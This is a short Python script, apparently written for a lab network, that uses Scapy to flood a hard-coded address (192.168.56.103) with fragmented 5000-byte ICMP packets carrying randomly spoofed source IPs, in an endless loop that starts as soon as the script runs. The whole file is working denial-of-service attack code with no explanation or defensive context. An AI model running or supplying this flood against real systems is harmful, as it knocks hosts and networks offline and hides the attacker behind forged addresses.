from scapy.all import *
import random

target_ip = "192.168.56.103"

def icmp_flood(target_ip):
    while True:
        ip_layer = IP(src=".".join(map(str, (random.randint(1, 254)
                     for _ in range(4)))), dst=target_ip)
        payload = "A" * 5000
        icmp_layer = ICMP()
        packet = ip_layer / icmp_layer / payload
        fragmented_packet = fragment(packet)
        send(fragmented_packet, verbose=0)

icmp_flood(target_ip)
